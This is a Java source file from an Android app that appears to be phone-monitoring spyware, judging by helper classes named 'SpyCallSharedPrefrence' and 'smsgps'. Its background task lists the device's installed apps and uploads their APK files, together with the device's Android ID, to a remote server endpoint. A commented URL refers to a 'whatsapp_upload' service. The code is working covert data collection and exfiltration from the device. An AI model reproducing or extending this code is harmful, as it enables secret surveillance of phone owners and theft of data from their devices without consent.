/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
package com.hinj.asynctask;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;

import org.json.JSONObject;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.graphics.Bitmap;
import android.os.AsyncTask;
import android.provider.Settings.Secure;
import android.util.Log;

import com.hinj.app.utils.ConnectUrl;
import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.InstalledApp;
import com.hinj.app.utils.JsonPostRequest;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.DeviceInterface;

public class ApkUploadAsyncTask extends AsyncTask<String, Void, String> {
	
	private Context ctx;
	private static final String TAG = "ApkUploadAsyncTask";
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;
	Bitmap resized;
	
	private InstalledApp[] latestInstalledApp;
	
	public ApkUploadAsyncTask(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected String doInBackground(String... params) {
		try{
			getAllInstalledApp();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedApkUpload();
		}
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) { 

	}
	
	/*********************** Start Installed App *********************/

	public final  void  getAllInstalledApp() {

		final List<PackageInfo> packs = ctx.getPackageManager().getInstalledPackages(0);
		latestInstalledApp = new InstalledApp[packs.size()];
		
		String apkPath = "";
		String applicationname="";
		String version = "";
		
		final int totalInstallAppCount=packs.size();
		final int preInstallAppCount = SpyCallSharedPrefrence.getsaveINSTALL_APP__APK_PreCount(ctx);
		final int remaningInstallAppCount = totalInstallAppCount - preInstallAppCount;
		
		int pp;
		
		String apk_name= "";
		int apk_index_number=SpyCallSharedPrefrence.getApkIndexNumber(ctx);
		
		SpyCallSharedPrefrence.getsaveINSTALL_APP__APK_PreCount(ctx);
		
		if(remaningInstallAppCount>0){
			
			Log.i("remaining count", remaningInstallAppCount+"");
			if(remaningInstallAppCount>2){
				 pp=2;
			}
			else{
				pp=remaningInstallAppCount;
			}
		    
			String tempInstalled = "";
			String installedAppDetail=null;
			apk_index_number++;
			//for (int i = 0; i < packs.size(); i++) {
				
			//	final String packageName = packs.get(i).packageName;
				apk_name = packs.get(apk_index_number).applicationInfo.loadLabel( ctx.getPackageManager()).toString();
				apkPath = packs.get(apk_index_number).applicationInfo.publicSourceDir;
				
				SpyCallSharedPrefrence.setApkIndexNumber(ctx, apk_index_number);
				SpyCallSharedPrefrence.setApkName(ctx, apk_name);
				
			//	applicationname = packs.get(i).applicationInfo.loadLabel( ctx.getPackageManager()).toString();
			//	version = packs.get(i).versionName;
				
			//	final long installedDate = getallapptime(packageName);
			//	latestInstalledApp[i]=new InstalledApp(Uri.encode(applicationname),Uri.encode(packageName),version,installedDate);
				
			//}
			
			//maindata();
 
				double size = new File(apkPath).length();
				System.out.println(size);
				double sizeMb = (size/1024)/1024;
				System.out.println(sizeMb);
				
				//return installedAppDetail;
				final int totalCount=preInstallAppCount+remaningInstallAppCount;
				int imagePreCount=preInstallAppCount + pp;
				if(sizeMb >= 5)
				{
					System.out.println("APK IS FREATER THAN 5 MB");
					
					SpyCallSharedPrefrence.saveINSTALL_APP_APK_PreCount(ctx,imagePreCount);
				} 
				else
				{
					try {
						if (Utility.isNetworkAvailable(ctx)) {
							
							//new YourAsyncTask_ImagesDetail().execute(apkPath, applicationname,  + totalCount, preInstallAppCount+ "",remaningInstallAppCount+"");
							new YourAsyncTask_ImagesDetail().execute(apkPath, apk_name, totalCount+ "",imagePreCount+"");
							//new InstalledAppPostAsyncTask().execute(installedAppDetail,totalCount+"");
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
		}else{
			Log.i(TAG, "No Install App log");
			//getCalendarEvents();
		}
	}
	
	public final long getallapptime(String packageName){
		final PackageManager pm = ctx.getPackageManager();
		ApplicationInfo appInfo = null;
		try {
			appInfo = pm.getApplicationInfo(packageName, 0);
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
		final String appFile = appInfo.sourceDir;

		final long installed = new File(appFile).lastModified();
		return installed;
	}

	@SuppressWarnings({ "unchecked", "rawtypes" })
	public final void maindata() {
		Arrays.sort( latestInstalledApp, new Comparator()
		{
			public int compare(Object o1, Object o2) {
				return new Long(((InstalledApp)o1).getInstalledDate()).compareTo(new Long(((InstalledApp) o2).getInstalledDate()));
			}
		});
	}
	
	class YourAsyncTask_ImagesDetail extends AsyncTask<String, Void, Void> {

		int getcountImage=0;
		int getRemainingCount;
		String getResponceImages;

		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params) {
			// make your request here - it will run in a different thread
			try {
				getcountImage=Integer.parseInt(params[2]);
				getRemainingCount=Integer.parseInt(params[3]);
				getResponceImages = uploadImage2(params[0], params[1]);

				JSONObject responseObject = new JSONObject(getResponceImages);
				//JSONArray responseArray = responseObject.getJSONArray("upload");
				JSONObject JsonResponse =responseObject.getJSONObject("response");
				if(JsonResponse.getString("apk").toString().contains("Apk file uploaded successfully"))
				{
					SpyCallSharedPrefrence.saveINSTALL_APP_APK_PreCount(ctx,Integer.parseInt(params[3]));
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

			return null;
		}

		@Override
		protected void onPostExecute(Void result) {			
		}
	}

	public String uploadImage2(String newFilePath, String appname) {
	
		String upload_device_id = HinjAppPreferenceUtils.getUploadDeviceID(ctx);
		String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
		Log.i("resonse", "anotherone");
		File file = new File(newFilePath);
		ArrayList<String> arraylist2 = new ArrayList<String>();
		arraylist2.add(file.getPath());
		ArrayList<String[]> arraylist1 = new ArrayList<String[]>();		
		String a[] = { "apk_name",appname};
		arraylist1.add(a);
		/*String b[] = { "user_id",getUserID_SP };
		arraylist1.add(b); */
		String c[] = { "upload_device_id", android_id };
		arraylist1.add(c); 
		
		JsonPostRequest postrequest = new JsonPostRequest();
		//http://evt17.com/iphone/android_services/whatsapp_upload
		String imageResponse = postrequest.doPostWithApkFile(ConnectUrl.URL_Apk_upload, arraylist1,arraylist2,appname);
		arraylist2.clear();
		arraylist1.clear();         
		return imageResponse;
	}
}
